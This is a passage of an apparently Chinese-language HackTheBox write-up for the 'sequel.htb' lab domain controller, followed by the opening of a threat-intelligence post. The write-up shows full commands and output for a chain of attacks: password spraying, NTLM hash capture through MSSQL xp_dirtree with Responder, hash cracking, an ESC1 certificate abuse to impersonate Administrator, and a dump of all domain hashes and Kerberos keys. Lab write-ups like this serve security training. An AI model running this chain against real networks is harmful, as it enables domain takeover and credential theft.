445 DC 1107: sequel\\James.Roberts (SidTypeUser)SMB 10.129.228.253 445 DC 1108: sequel\\Nicole.Thompson (SidTypeUser)SMB 10.129.228.253 445 DC 1109: sequel\\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)# 可以整理一下$ nxc smb sequel.htb -u guest -p &#x27;&#x27; --rid-brute | grep SidTypeUser | awk -F &#x27;\\&#x27; &#x27;&#123;print $2&#125;&#x27; | awk -F &#x27; &#x27; &#x27;&#123;print $1&#125;&#x27; | tee userAdministratorGuestkrbtgtDC$Tom.HennBrandon.BrownRyan.Coopersql_svcJames.RobertsNicole.Thompson 看一下pdf是什么内容这给了一个PublicUser:GuestUserCantWrite1，让我们去登mssql，我偏不 12345678910111213141516171819202122232425$ nxc smb sequel.htb -u user -p &quot;GuestUserCantWrite1&quot; --continue-on-successSMB 10.129.228.253 445 DC [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) SMB 10.129.228.253 445 DC [-] sequel.htb\\Administrator:GuestUserCantWrite1 STATUS_LOGON_FAILURE SMB 10.129.228.253 445 DC [-] sequel.htb\\Guest:GuestUserCantWrite1 STATUS_LOGON_FAILURE SMB 10.129.228.253 445 DC [-] sequel.htb\\krbtgt:GuestUserCantWrite1 STATUS_LOGON_FAILURE SMB 10.129.228.253 445 DC [-] sequel.htb\\DC$:GuestUserCantWrite1 STATUS_LOGON_FAILURE SMB 10.129.228.253 445 DC [-] sequel.htb\\Tom.Henn:GuestUserCantWrite1 STATUS_LOGON_FAILURE SMB 10.129.228.253 445 DC [-] sequel.htb\\Brandon.Brown:GuestUserCantWrite1 STATUS_LOGON_FAILURE SMB 10.129.228.253 445 DC [-] sequel.htb\\Ryan.Cooper:GuestUserCantWrite1 STATUS_LOGON_FAILURE SMB 10.129.228.253 445 DC [-] sequel.htb\\sql_svc:GuestUserCantWrite1 STATUS_LOGON_FAILURE SMB 10.129.228.253 445 DC [-] sequel.htb\\James.Roberts:GuestUserCantWrite1 STATUS_LOGON_FAILURE SMB 10.129.228.253 445 DC [-] sequel.htb\\Nicole.Thompson:GuestUserCantWrite1 STATUS_LOGON_FAILURE $ nxc winrm sequel.htb -u user -p &quot;GuestUserCantWrite1&quot; --continue-on-success WINRM 10.129.228.253 5985 DC [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb) WINRM 10.129.228.253 5985 DC [-] sequel.htb\\Administrator:GuestUserCantWrite1 WINRM 10.129.228.253 5985 DC [-] sequel.htb\\Guest:GuestUserCantWrite1 WINRM 10.129.228.253 5985 DC [-] sequel.htb\\krbtgt:GuestUserCantWrite1 WINRM 10.129.228.253 5985 DC [-] sequel.htb\\DC$:GuestUserCantWrite1WINRM 10.129.228.253 5985 DC [-] sequel.htb\\Tom.Henn:GuestUserCantWrite1WINRM 10.129.228.253 5985 DC [-] sequel.htb\\Brandon.Brown:GuestUserCantWrite1WINRM 10.129.228.253 5985 DC [-] sequel.htb\\Ryan.Cooper:GuestUserCantWrite1WINRM 10.129.228.253 5985 DC [-] sequel.htb\\sql_svc:GuestUserCantWrite1WINRM 10.129.228.253 5985 DC [-] sequel.htb\\James.Roberts:GuestUserCantWrite1WINRM 10.129.228.253 5985 DC [-] sequel.htb\\Nicole.Thompson:GuestUserCantWrite1 呜呜呜我错了 ntlm hash hijack想起来有一个impacket-mssqlclient，用一下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556$ mssqlclient.py PublicUser@sequel.htb Impacket v0.11.0 - Copyright 2023 FortraPassword:[*] Encryption required, switching to TLS[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(DC\\SQLMOCK): Line 1: Changed database context to &#x27;master&#x27;.[*] INFO(DC\\SQLMOCK): Line 1: Changed language setting to us_english.[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commandsSQL (PublicUser guest@master)&gt; SQL (PublicUser guest@master)&gt; enum_db name is_trustworthy_on ------ ----------------- master 0 tempdb 0 model 0 msdb 1 SQL (PublicUser guest@msdb)&gt; enum_users;[%] EXEC sp_helpuserUserName RoleName LoginName DefDBName DefSchemaName UserID SID ------------------ -------- --------- --------- ------------- ---------- ----- dbo db_owner sa master dbo b&#x27;1 &#x27; b&#x27;01&#x27; guest public NULL NULL guest b&#x27;2 &#x27; b&#x27;00&#x27; INFORMATION_SCHEMA public NULL NULL NULL b&#x27;3 &#x27; NULL sys public NULL NULL NULL b&#x27;4 &#x27; NULL SQL (PublicUser guest@msdb)&gt; enum_logins;[%] select r.name,r.type_desc,r.is_disabled, sl.sysadmin, sl.securityadmin, sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin from master.sys.server_principals r left join master.sys.syslogins sl on sl.sid = r.sid where r.type in (&#x27;S&#x27;,&#x27;E&#x27;,&#x27;X&#x27;,&#x27;U&#x27;,&#x27;G&#x27;)name type_desc is_disabled sysadmin securityadmin serveradmin setupadmin processadmin diskadmin dbcreator bulkadmin ---------- --------- ----------- -------- ------------- ----------- ---------- ------------ --------- --------- --------- sa SQL_LOGIN 0 1 0 0 0 0 0 0 0 PublicUser SQL_LOGIN 0 0 0 0 0 0 0 0 0 SQL (PublicUser guest@msdb)&gt; exec_as_user sa;[%] execute as user=&#x27;sa;&#x27;;[-] ERROR(DC\\SQLMOCK): Line 1: Cannot execute as the database principal because the principal &quot;sa;&quot; does not exist, this type of principal cannot be impersonated, or you do not have permission.SQL (PublicUser guest@msdb)&gt; xp_dirtree[%] exec master.sys.xp_dirtree &#x27;&#x27;,1,1subdirectory depth file ------------ ----- ---- 只有一个xp_dirtree可以用了，捕获一下哈希 12345678910111213141516171819202122# mssqlclientSQL (PublicUser guest@msdb)&gt; xp_dirtree \\\\10.10.xx.xx\\wtf[%] exec master.sys.xp_dirtree &#x27;\\\\10.10.xx.xx\\wtf&#x27;,1,1subdirectory depth file ------------ ----- ---- # attacker$ sudo responder -I tun0 [sudo] wansh 的密码： __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR &amp; MDNS Responder 3.1.5.0。。。[+] Listening for events...[SMB] NTLMv2-SSP Client : 10.129.228.253[SMB] NTLMv2-SSP Username : sequel\\sql_svc[SMB] NTLMv2-SSP Hash : sql_svc::sequel:6a70418a9d8ff944:8E1A9D4D85A3A767E34BB54A66A5E2E1:010100000000000080A5E6F4E4B9DB01FAB0ABB16AB6BA840000000002000800590032005200380001001E00570049004E002D0032003200360052003000500059005A004E004700430004003400570049004E002D0032003200360052003000500059005A004E00470043002E0059003200520038002E004C004F00430041004C000300140059003200520038002E004C004F00430041004C000500140059003200520038002E004C004F00430041004C000700080080A5E6F4E4B9DB0106000400020000000800300030000000000000000000000000300000FA90285910D05096AA63E8D7615F591D4001CD78305A23CF9E82020B03A331D70A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0033000000000000000000 hashcat crack it 12$ hashcat -m 5600 hash /usr/share/payloads/seclists/Passwords/Leaked-Databases/rockyou.txtSQL_SVC::sequel:6a70418a9d8ff944:8e1a9d4d85a3a767e34bb54a66a5e2e1:010100000000000080a5e6f4e4b9db01fab0abb16ab6ba840000000002000800590032005200380001001e00570049004e002d0032003200360052003000500059005a004e004700430004003400570049004e002d0032003200360052003000500059005a004e00470043002e0059003200520038002e004c004f00430041004c000300140059003200520038002e004c004f00430041004c000500140059003200520038002e004c004f00430041004c000700080080a5e6f4e4b9db0106000400020000000800300030000000000000000000000000300000fa90285910d05096aa63e8d7615f591d4001cd78305a23cf9e82020b03a331d70a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0033000000000000000000:REGGIE1234ronnie 又有一个密码了，在喷射一下 123456789101112$ nxc smb sequel.htb -u user -p &quot;REGGIE1234ronnie&quot; --continue-on-success SMB 10.129.228.253 445 DC [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) SMB 10.129.228.253 445 DC [-] sequel.htb\\Administrator:REGGIE1234ronnie STATUS_LOGON_FAILURE SMB 10.129.228.253 445 DC [-] sequel.htb\\Guest:REGGIE1234ronnie STATUS_LOGON_FAILURE SMB 10.129.228.253 445 DC [-] sequel.htb\\krbtgt:REGGIE1234ronnie STATUS_LOGON_FAILURE SMB 10.129.228.253 445 DC [-] sequel.htb\\DC$:REGGIE1234ronnie STATUS_LOGON_FAILURE SMB 10.129.228.253 445 DC [-] sequel.htb\\Tom.Henn:REGGIE1234ronnie STATUS_LOGON_FAILURE SMB 10.129.228.253 445 DC [-] sequel.htb\\Brandon.Brown:REGGIE1234ronnie STATUS_LOGON_FAILURE SMB 10.129.228.253 445 DC [-] sequel.htb\\Ryan.Cooper:REGGIE1234ronnie STATUS_LOGON_FAILURE SMB 10.129.228.253 445 DC [+] sequel.htb\\sql_svc:REGGIE1234ronnie SMB 10.129.228.253 445 DC [-] sequel.htb\\James.Roberts:REGGIE1234ronnie STATUS_LOGON_FAILURE SMB 10.129.228.253 445 DC [-] sequel.htb\\Nicole.Thompson:REGGIE1234ronnie STATUS_LOGON_FAILURE 行吧，还是sql_svc 123456789101112$ nxc winrm sequel.htb -u user -p &quot;REGGIE1234ronnie&quot; --continue-on-success WINRM 10.129.228.253 5985 DC [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)WINRM 10.129.228.253 5985 DC [-] sequel.htb\\Administrator:REGGIE1234ronnieWINRM 10.129.228.253 5985 DC [-] sequel.htb\\Guest:REGGIE1234ronnieWINRM 10.129.228.253 5985 DC [-] sequel.htb\\krbtgt:REGGIE1234ronnieWINRM 10.129.228.253 5985 DC [-] sequel.htb\\DC$:REGGIE1234ronnieWINRM 10.129.228.253 5985 DC [-] sequel.htb\\Tom.Henn:REGGIE1234ronnieWINRM 10.129.228.253 5985 DC [-] sequel.htb\\Brandon.Brown:REGGIE1234ronnieWINRM 10.129.228.253 5985 DC [-] sequel.htb\\Ryan.Cooper:REGGIE1234ronnieWINRM 10.129.228.253 5985 DC [+] sequel.htb\\sql_svc:REGGIE1234ronnie (Pwn3d!)WINRM 10.129.228.253 5985 DC [-] sequel.htb\\James.Roberts:REGGIE1234ronnieWINRM 10.129.228.253 5985 DC [-] sequel.htb\\Nicole.Thompson:REGGIE1234ronnie 不行，还得是sql_svc shell as sql_svc123456789101112131415$ sudo evil-winrm -i dc.sequel.htb -u sql_svc -p &#x27;REGGIE1234ronnie&#x27;/root/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining &#x27;object_id&#x27; may cause serious problems/root/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining &#x27;object_id&#x27; may cause serious problems Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: undefined method &#x27;quoting_detection_proc&#x27; for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\sql_svc\\Documents&gt; cd ..*Evil-WinRM* PS C:\\Users\\sql_svc&gt; cd desktop*Evil-WinRM* PS C:\\Users\\sql_svc\\desktop&gt; dir*Evil-WinRM* PS C:\\Users\\sql_svc\\desktop&gt; 在主目录下有一个SQLServer文件夹，进去翻一下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950*Evil-WinRM* PS C:\\Users\\sql_svc\\desktop&gt; cd C:\\ 15:44:59 [9/367]*Evil-WinRM* PS C:\\&gt; dir Directory: C:\\ Mode LastWriteTime Length Name ---- ------------- ------ ----d----- 2/1/2023 8:15 PM PerfLogsd-r--- 2/6/2023 12:08 PM Program Filesd----- 11/19/2022 3:51 AM Program Files (x86)d----- 11/19/2022 3:51 AM Publicd----- 2/1/2023 1:02 PM SQLServerd-r--- 2/1/2023 1:55 PM Usersd----- 2/6/2023 7:21 AM Windows*Evil-WinRM* PS C:\\&gt; cd SQLServer*Evil-WinRM* PS C:\\SQLServer&gt; dir Directory: C:\\SQLServerMode LastWriteTime Length Name---- ------------- ------ ----d----- 2/7/2023 8:06 AM Logsd----- 11/18/2022 1:37 PM SQLEXPR_2019-a---- 11/18/2022 1:35 PM 6379936 sqlexpress.exe-a---- 11/18/2022 1:36 PM 268090448 SQLEXPR_x64_ENU.exe*Evil-WinRM* PS C:\\SQLServer&gt; cd Logs*Evil-WinRM* PS C:\\SQLServer\\Logs&gt; dir Directory: C:\\SQLServer\\LogsMode LastWriteTime Length Name---- ------------- ------ -----a---- 2/7/2023 8:06 AM 27608 ERRORLOG.BAK*Evil-WinRM* PS C:\\SQLServer\\Logs&gt; download ERRORLOG.BAK Info: Downloading C:\\SQLServer\\Logs\\ERRORLOG.BAK to ERRORLOG.BAK Info: Download successful! get pass at .bak看一下这个备份文件 123452022-11-18 13:43:07.44 Logon Error: 18456, Severity: 14, State: 8.2022-11-18 13:43:07.44 Logon Logon failed for user &#x27;sequel.htb\\Ryan.Cooper&#x27;. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]2022-11-18 13:43:07.48 Logon Error: 18456, Severity: 14, State: 8.2022-11-18 13:43:07.48 Logon Logon failed for user &#x27;NuclearMosquito3&#x27;. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]2022-11-18 13:43:07.72 spid51 Attempting to load library &#x27;xpstar.dll&#x27; into memory. This is an informational message only. No user action is required. 又要成盯真了用NuclearMosquito3喷射一下 12345678910111213141516171819202122232425$ nxc smb sequel.htb -u user -p &quot;NuclearMosquito3&quot; --continue-on-successSMB 10.129.228.253 445 DC [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) SMB 10.129.228.253 445 DC [-] sequel.htb\\Administrator:NuclearMosquito3 STATUS_LOGON_FAILURE SMB 10.129.228.253 445 DC [-] sequel.htb\\Guest:NuclearMosquito3 STATUS_LOGON_FAILURE SMB 10.129.228.253 445 DC [-] sequel.htb\\krbtgt:NuclearMosquito3 STATUS_LOGON_FAILURE SMB 10.129.228.253 445 DC [-] sequel.htb\\DC$:NuclearMosquito3 STATUS_LOGON_FAILURE SMB 10.129.228.253 445 DC [-] sequel.htb\\Tom.Henn:NuclearMosquito3 STATUS_LOGON_FAILURE SMB 10.129.228.253 445 DC [-] sequel.htb\\Brandon.Brown:NuclearMosquito3 STATUS_LOGON_FAILURE SMB 10.129.228.253 445 DC [+] sequel.htb\\Ryan.Cooper:NuclearMosquito3 SMB 10.129.228.253 445 DC [-] sequel.htb\\sql_svc:NuclearMosquito3 STATUS_LOGON_FAILURE SMB 10.129.228.253 445 DC [-] sequel.htb\\James.Roberts:NuclearMosquito3 STATUS_LOGON_FAILURE SMB 10.129.228.253 445 DC [-] sequel.htb\\Nicole.Thompson:NuclearMosquito3 STATUS_LOGON_FAILURE $ nxc winrm sequel.htb -u user -p &quot;NuclearMosquito3&quot; --continue-on-successWINRM 10.129.228.253 5985 DC [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)WINRM 10.129.228.253 5985 DC [-] sequel.htb\\Administrator:NuclearMosquito3WINRM 10.129.228.253 5985 DC [-] sequel.htb\\Guest:NuclearMosquito3WINRM 10.129.228.253 5985 DC [-] sequel.htb\\krbtgt:NuclearMosquito3WINRM 10.129.228.253 5985 DC [-] sequel.htb\\DC$:NuclearMosquito3WINRM 10.129.228.253 5985 DC [-] sequel.htb\\Tom.Henn:NuclearMosquito3WINRM 10.129.228.253 5985 DC [-] sequel.htb\\Brandon.Brown:NuclearMosquito3WINRM 10.129.228.253 5985 DC [+] sequel.htb\\Ryan.Cooper:NuclearMosquito3 (Pwn3d!)WINRM 10.129.228.253 5985 DC [-] sequel.htb\\sql_svc:NuclearMosquito3WINRM 10.129.228.253 5985 DC [-] sequel.htb\\James.Roberts:NuclearMosquito3WINRM 10.129.228.253 5985 DC [-] sequel.htb\\Nicole.Thompson:NuclearMosquito3 shell as Ryan.Cooper（这里先去装一下bloodhound-ce） 12345678910111213141516171819202122$ bloodhound-python -d sequel.htb -u ryan.cooper -p &quot;NuclearMosquito3&quot; -c all -ns 10.129.228.253 --zip INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)INFO: Found AD domain: sequel.htbINFO: Getting TGT for userWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)INFO: Connecting to LDAP server: dc.sequel.htbWARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...INFO: Found 1 domainsINFO: Found 1 domains in the forestINFO: Found 1 computersINFO: Connecting to LDAP server: dc.sequel.htbWARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...INFO: Found 10 usersINFO: Found 53 groupsINFO: Found 2 gposINFO: Found 1 ousINFO: Found 19 containersINFO: Found 0 trustsINFO: Starting computer enumeration with 10 workersINFO: Querying computer: dc.sequel.htbINFO: Done in 00M 25SINFO: Compressing output into 20250430163207_bloodhound.zip 导进去看一下真乱呀 ESC1 classic abuse看下证书 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758$ certipy find -u ryan.cooper@sequel.htb -p &quot;NuclearMosquito3&quot; -dc-ip 10.129.228.253Certipy v4.8.2 - by Oliver Lyak (ly4k)[*] Finding certificate templates[*] Found 34 certificate templates[*] Finding certificate authorities[*] Found 1 certificate authority[*] Found 12 enabled certificate templates[*] Trying to get CA configuration for &#x27;sequel-DC-CA&#x27; via CSRA[!] Got error while trying to get CA configuration for &#x27;sequel-DC-CA&#x27; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.[*] Trying to get CA configuration for &#x27;sequel-DC-CA&#x27; via RRP[!] Failed to connect to remote registry. Service should be starting now. Trying again...[*] Got CA configuration for &#x27;sequel-DC-CA&#x27;[*] Saved BloodHound data to &#x27;20250430164217_Certipy.zip&#x27;. Drag and drop the file into the BloodHound GUI from @ly4k[*] Saved text output to &#x27;20250430164217_Certipy.txt&#x27;[*] Saved JSON output to &#x27;20250430164217_Certipy.json&#x27;$ cat 20250430164217_Certipy.tx0 16:42:48 [1082/5078] Template Name : UserAuthentication Display Name : UserAuthentication Certificate Authorities : sequel-DC-CA Enabled : True Client Authentication : True Enrollment Agent : False Any Purpose : False Enrollee Supplies Subject : True Certificate Name Flag : EnrolleeSuppliesSubject Enrollment Flag : PublishToDs IncludeSymmetricAlgorithms Private Key Flag : ExportableKey Extended Key Usage : Client Authentication Secure Email Encrypting File System Requires Manager Approval : False Requires Key Archival : False Authorized Signatures Required : 0 Validity Period : 10 years Renewal Period : 6 weeks Minimum RSA Key Length : 2048 Permissions Enrollment Permissions Enrollment Rights : SEQUEL.HTB\\Domain Admins SEQUEL.HTB\\Domain Users SEQUEL.HTB\\Enterprise Admins Object Control Permissions Owner : SEQUEL.HTB\\Administrator Write Owner Principals : SEQUEL.HTB\\Domain Admins SEQUEL.HTB\\Enterprise Admins SEQUEL.HTB\\Administrator Write Dacl Principals : SEQUEL.HTB\\Domain Admins SEQUEL.HTB\\Enterprise Admins SEQUEL.HTB\\Administrator Write Property Principals : SEQUEL.HTB\\Domain Admins SEQUEL.HTB\\Enterprise Admins SEQUEL.HTB\\Administrator [!] Vulnerabilities ESC1 : &#x27;SEQUEL.HTB\\\\Domain Users&#x27; can enroll, enrollee supplies subject and template allows client authentication 给了一个ESC1的滥用求一张 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849$ certipy req -ca sequel-DC-CA -template UserAuthentication -dc-ip 10.129.228.253 -target dc.sequel.htb -u ryan.cooper -p &quot;NuclearMosquito3&quot; -ns 10.129.228.253 -upn administrator@sequel.htbCertipy v4.8.2 - by Oliver Lyak (ly4k)[*] Requesting certificate via RPC[*] Successfully requested certificate[*] Request ID is 18[*] Got certificate with UPN &#x27;administrator@sequel.htb&#x27;[*] Certificate has no object SID[*] Saved certificate and private key to &#x27;administrator.pfx&#x27;$ certipy auth -pfx administrator.pfx Certipy v4.8.2 - by Oliver Lyak (ly4k)[*] Using principal: administrator@sequel.htb[*] Trying to get TGT...[*] Got TGT[*] Saved credential cache to &#x27;administrator.ccache&#x27;[*] Trying to retrieve NT hash for &#x27;administrator&#x27;[*] Got hash for &#x27;administrator@sequel.htb&#x27;: aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee$ export KRB5CCNAME=administrator.ccache$ sudo evil-winrm -i dc.sequel.htb -u administrator -H &quot;a52f78e4c751e5f5e17e1e9f3e58f4ee&quot; /root/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining &#x27;object_id&#x27; may cause serious problems/root/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining &#x27;object_id&#x27; may cause serious problems Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: undefined method &#x27;quoting_detection_proc&#x27; for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; cd ..*Evil-WinRM* PS C:\\Users\\Administrator&gt; cd desktop*Evil-WinRM* PS C:\\Users\\Administrator\\desktop&gt; dir Directory: C:\\Users\\Administrator\\desktopMode LastWriteTime Length Name---- ------------- ------ -----ar--- 4/30/2025 7:55 AM 34 root.txt*Evil-WinRM* PS C:\\Users\\Administrator\\desktop&gt; type root.txtba6b161dc83e8556b828d1a9017c2c87*Evil-WinRM* PS C:\\Users\\Administrator\\desktop&gt; Hashes1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374$ secretsdump.py -k -no-pass sequel.htb/administrator@dc.sequel.htb Impacket v0.11.0 - Copyright 2023 Fortra [*] Service RemoteRegistry is in stopped state [*] Starting service RemoteRegistry [*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:cbf36a6101cb1a15e11f776ec6d5d77b:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn&#x27;t have hash information.[*] Dumping cached domain logon information (domain/username:hash) [*] Dumping LSA Secrets [*] $MACHINE.ACC sequel\\DC$:plain_password_hex:cc9d5ea540f6ae97c66daeedd41fe8ecaf6cee114ac8eaf357da86e1ce2fa2987fc73fd54a5db4e07d16bd9e83275f6484e592610cc294f3f683793b2653e842067a03d96a1bd83cbe33ad48f4d8e4555a44b0bb95fa5f36af8f6ca77064f2985e3a3e08925d7d19c686f93b9b69d4a1ab348e92d61e242d3c4d636ae57e7e0766f095526dcf5ef85a64cf5cd213e04ecde1aa86706ea1a36e77a0ed94e0c869efa288d5b47e6874885969f180b029cd3ead8e2ee128b6f80b83f9500fb7e4e0dbc340e74bf43caaf5d0f103fcf73eed686661ff104ba1a1498fc0586fa208364bb4c8483de977525db1b3bebef96e86sequel\\DC$:aad3b435b51404eeaad3b435b51404ee:d1e9e6b7560bdb3317784b603a19c20e::: [*] DPAPI_SYSTEM dpapi_machinekey:0x85ec8dd0e44681d9dc3ed5f0c130005786daddbd dpapi_userkey:0x22043071c1e87a14422996eda74f2c72535d4931 [*] NL$KM 0000 31 BF AC 76 98 3E CF 4A FC BD AD 0F 17 0F 49 E7 1..v.&gt;.J......I. 0010 DA 65 A6 F9 C7 D4 FA 92 0E 5C 60 74 E6 67 BE A7 .e.......\\`t.g.. 0020 88 14 9D 4D E5 A5 3A 63 E4 88 5A AC 37 C7 1B F9 ...M..:c..Z.7... 0030 53 9C C1 D1 6F 63 6B D1 3F 77 F4 3A 32 54 DA AC S...ock.?w.:2T..NL$KM:31bfac76983ecf4afcbdad0f170f49e7da65a6f9c7d4fa920e5c6074e667bea788149d4de5a53a63e4885aac37c71bf9539cc1d16f636bd13f77f43a3254daac[*] _SC_MSSQL$SQLMOCK sequel\\sql_svc:REGGIE1234ronnie[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)[*] Using the DRSUAPI method to get NTDS.DIT secretsAdministrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::Tom.Henn:1103:aad3b435b51404eeaad3b435b51404ee:22e99d2b3043bbb0a480705c9b0e71ac:::Brandon.Brown:1104:aad3b435b51404eeaad3b435b51404ee:f562f509ad646c666f83b45f90a58af3:::Ryan.Cooper:1105:aad3b435b51404eeaad3b435b51404ee:98981eed8e9ce0763bb3c5b3c7ed5945:::sql_svc:1106:aad3b435b51404eeaad3b435b51404ee:1443ec19da4dac4ffc953bca1b57b4cf:::James.Roberts:1107:aad3b435b51404eeaad3b435b51404ee:cc69ea05e9ab430702679d5706b39075:::Nicole.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:235da7fbef7d0861301b4078d56afdc5:::DC$:1000:aad3b435b51404eeaad3b435b51404ee:d1e9e6b7560bdb3317784b603a19c20e:::[*] Kerberos keys grabbedAdministrator:aes256-cts-hmac-sha1-96:0ba0bb35571c5d0e19849c9c2b92539a4ce6a8fd3dd6348fb6a0888797dedd16Administrator:aes128-cts-hmac-sha1-96:37cbf2133cdec2b7e5531957a21e791fAdministrator:des-cbc-md5:5d76e0d3c245a2a4krbtgt:aes256-cts-hmac-sha1-96:b3f74f6e968fb5d2cf17f36f417bc46259623626953ed30f8faf3cd00b91c8dekrbtgt:aes128-cts-hmac-sha1-96:919e6861b6306e3367a9223a154473eckrbtgt:des-cbc-md5:6d1f1cd391e01a91Tom.Henn:aes256-cts-hmac-sha1-96:bb3886d7e3201d11055cf8a2ef587d83b448d33d77aab36dd84b4ce8c59fc0a2 Tom.Henn:aes128-cts-hmac-sha1-96:0a221bf0f01f109c86cc1668783b80d3Tom.Henn:des-cbc-md5:1a46dc3858150401Brandon.Brown:aes256-cts-hmac-sha1-96:1aad383c76610c43bf638873ff5d7f0d7cd5cffccdfb6dd16754f15b83217550Brandon.Brown:aes128-cts-hmac-sha1-96:cb92957a61468212c2e1f26f2958b892Brandon.Brown:des-cbc-md5:91b3a13edf6e6201Ryan.Cooper:aes256-cts-hmac-sha1-96:b9a2b7df6161b9a31a15cfbbb17f68a5b3904eaa2ea21d8ed2ef9acb5e27b997Ryan.Cooper:aes128-cts-hmac-sha1-96:cbe89554da97001fa8fd0967f1799104Ryan.Cooper:des-cbc-md5:f4a445754f540104sql_svc:aes256-cts-hmac-sha1-96:bcbbff82091c7c6f9875261d3ada97274d01b4a1f93ceb16e8154606e392a4aesql_svc:aes128-cts-hmac-sha1-96:decddf91c717c5a5b84e112f576ece3bsql_svc:des-cbc-md5:73ae15efdafe751fJames.Roberts:aes256-cts-hmac-sha1-96:d503bb2c7eea7bf50e7f68ca967e4a6f8a903b22cffa07cf2c160580156f8a43James.Roberts:aes128-cts-hmac-sha1-96:33c8d3d907cd51ffa5274ce0b16ba448James.Roberts:des-cbc-md5:e53de99770a20bf2Nicole.Thompson:aes256-cts-hmac-sha1-96:fd75cd1b02ed4cb838c996db6d7616157d19545c60fb23156abdb3a400bc371cNicole.Thompson:aes128-cts-hmac-sha1-96:0c86380c787deb624027e9d1d8d71ab2Nicole.Thompson:des-cbc-md5:31b5e386b33e2589DC$:aes256-cts-hmac-sha1-96:7273137e3dec6556a5bdf7757e263b1c50320c00d5b0fff30b2dd4b01543c695DC$:aes128-cts-hmac-sha1-96:e7c64e545316e8cb28c860f10705e2bfDC$:des-cbc-md5:2ae0f438f4b97623[*] Cleaning up... [*] Stopping service RemoteRegistry[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.[*] Cleaning up... [*] Stopping service RemoteRegistry","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://example.com/tags/writeup/"}]},{"title":"HackTheBox——SherLocks ElectricBreeze-1 Writeup","slug":"ElectricBreeze-1/ElectricBreeze-1","date":"2025-06-19T13:59:05.015Z","updated":"2025-06-19T13:59:05.019Z","comments":true,"path":"2025/06/19/ElectricBreeze-1/ElectricBreeze-1/","permalink":"http://example.com/2025/06/19/ElectricBreeze-1/ElectricBreeze-1/","excerpt":"","text":"Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 Your security team must always be up-to-date and aware of the threats targeting organizations in your industry. As you begin your journey as a Threat Intelligence Intern, equipped with some SOC experience, your manager has assigned you a task to test your research skills and how effectively you can leverage the MITRE ATT&amp;CK framework. * Conduct thorough research on Volt Typhoon. * Use the MITRE ATT&amp;CK framework to map adversary behavior and tactics into actionable insights. Impress your manager with your assessment, showcasing your passion for threat intelligence. 